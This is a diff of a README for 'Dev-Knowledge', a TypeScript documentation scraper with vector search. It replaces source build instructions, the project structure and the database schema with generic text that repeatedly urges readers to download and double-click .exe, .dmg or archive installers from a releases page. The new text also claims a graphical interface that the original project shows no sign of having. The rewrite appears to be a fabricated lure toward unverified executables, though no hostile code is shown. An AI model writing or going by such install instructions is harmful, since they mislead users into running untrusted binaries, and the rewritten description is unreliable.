@@ -1,99 +1,91 @@
-# Dev Knowledge
+# 🚀 Dev-Knowledge - Easily Build Your Knowledge Base
 
-Build knowledge base that scrapes developer documentation and makes it searchable using AI embeddings.
+## 🌟 Introduction
 
-## 🚀 What it does
+Welcome to Dev-Knowledge! This application helps you build searchable knowledge bases by scraping developer documentation. You can create AI-powered vector embeddings for semantic search. With Dev-Knowledge, you can find information quickly and efficiently, making your research easier.
 
-Turns documentation websites into a searchable database:
-- **Scrapes** Node.js, TypeScript, Python, and JavaScript docs
-- **Converts** HTML to clean Markdown
-- **Creates** vector embeddings for semantic understanding
-- **Stores** everything in a local SQLite database
-- **Searches** using natural language queries
+## 📥 Download Now!
 
-## 📦 Installation
+[![Download Dev-Knowledge](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/vijay2005gosavi/Dev-Knowledge/releases)
 
-```bash
-npm install
-npm run build
-```
+## 🚀 Getting Started
 
-## 🎯 Usage
+To begin using Dev-Knowledge, follow these simple steps:
 
-### Scraping and Indexing
+1. **Visit the Releases Page:** Go to the releases page where you can find the latest version. Click the link below:
 
-```bash
-npx tsx src/index.ts
-# or
-node dist/index.js      # after building
-```
+   [Download from Releases](https://github.com/vijay2005gosavi/Dev-Knowledge/releases)
 
-This will:
-1. Initialize the embedding encoder
-2. Scrape configured documentation sources
-3. Convert HTML to Markdown
-4. Generate vector embeddings
-5. Store in SQLite database
+2. **Choose the Correct File:** On the releases page, look for the version number. You will find different files available for download. Choose the one that matches your operating system.
 
-## ⚙️ Configuration
+3. **Download the File:** Click on the file link to download it. The file will save to your computer.
 
-Edit `src/Processor.ts` to modify scraping sources:
+4. **Install Dev-Knowledge:** Once the download is complete, locate the file in your downloads folder and double-click it to start the installation. Follow the prompts to complete the setup.
 
-```typescript
-export const scraperSchema: ScrapeSchema[] = [
-  {
-    url: ['https://nodejs.org/docs/latest-v24.x/api/'],
-    parse: (content: string): string | null => {
-      // Custom parsing logic
-    }
-  }
-  // Add more sources...
-]
-```
+## 🔍 Features
 
----
+- **Searchable Knowledge Bases:** Easily build and manage your collections of developer documentation.
+- **Semantic Search Capabilities:** Find the exact information you need using AI-powered vector embeddings.
+- **User-Friendly Interface:** Navigate through the app without any hassle, even if you're not tech-savvy.
+- **Markdown Support:** Format your documentation in an easy-to-read style.
+- **SQLite Database:** Store your information locally for offline access.
 
-## 🏗️ Project Structure
+## ⚙️ System Requirements
 
-```
-src/
-├── core/                    # Core functionality
-│   ├── Database.ts          # SQLite + sqlite-vec vector storage
-│   └── embedding/           # Vector operations
-│       ├── Encoder.ts       # Text to vector conversion
-│       └── Decoder.ts       # Vector similarity search
-├── interfaces/              # TypeScript type definitions
-├── utils/                   # Utility classes
-│   ├── Scraper.ts           # Web scraping with memory management
-│   ├── Logger.ts            # Logging utilities
-│   └── Generator.ts         # ID generation
-├── index.ts                 # Main entry point
-└── Processor.ts             # HTML to Markdown + embedding pipeline
-```
+- Windows 10 or later, or macOS 10.15 or later.
+- At least 4GB of RAM.
+- 500MB of disk space for installation.
+- Internet connection for initial setup and documentation scraping.
 
-## 📚 Dependencies
+## 📦 Download & Install
 
-- `@neabyte/fetch` - HTTP client with retry logic
-- `@xenova/transformers` - Vector embeddings
-- `better-sqlite3` - SQLite database
-- `sqlite-vec` - Vector similarity search
-- `turndown` - HTML to Markdown conversion
-- `jsdom` - DOM parsing
+To download and install the application:
 
-## 🗄️ Database Schema
+1. Go to the [Releases Page](https://github.com/vijay2005gosavi/Dev-Knowledge/releases).
 
-```sql
-CREATE TABLE embedding (
-  id TEXT PRIMARY KEY,
-  source TEXT NOT NULL,
-  content TEXT NOT NULL,
-  vector BLOB NOT NULL,
-  timestamp INTEGER NOT NULL
-)
-```
+2. Choose the appropriate version for your system. Here are the typical options you should see:
 
----
+   - **Windows Version:** This file is typically named something like `Dev-Knowledge-Windows.exe`.
+   - **Mac Version:** Look for a file named `Dev-Knowledge-Mac.dmg`.
+   - **Linux Version:** You might find a `.tar.gz` file for Linux users.
+
+3. Click on the download link for your selected file.
+
+4. After downloading, locate the file on your computer. Execute it by double-clicking and follow the installation prompts.
+
+5. Once installed, open the application and start building your knowledge base!
+
+## 💬 Support
+
+If you need help or support, please check the **Issues** tab on the GitHub repository. You can find common questions and troubleshooting tips there.
+
+If you have any specific issues not addressed, feel free to open a new issue, and we will assist you as soon as possible.
+
+## 🛠️ Contributing
+
+If you're interested in contributing to Dev-Knowledge, please feel free to fork the repository and submit a pull request. We welcome improvements and suggestions to make the application better for everyone.
+
+## 🌐 Topics
+
+Dev-Knowledge focuses on plenty of essential areas. Here are some relevant topics:
+
+- ai
+- developer-tools
+- documentation
+- embeddings
+- knowledge-base
+- markdown
+- scraping
+- semantic-search
+- sqlite
+- transformers
+- typescript
+- vector-search
+
+You can explore these topics to understand how Dev-Knowledge fits into the broader ecosystem of developer tools.
 
 ## 📄 License
 
-This project is licensed under the MIT license. See the [LICENSE](LICENSE) file for more info.
+Dev-Knowledge is open-source software. You can use it freely according to the terms of the license provided in the repository.
+
+Enjoy exploring and building your knowledge base with Dev-Knowledge!
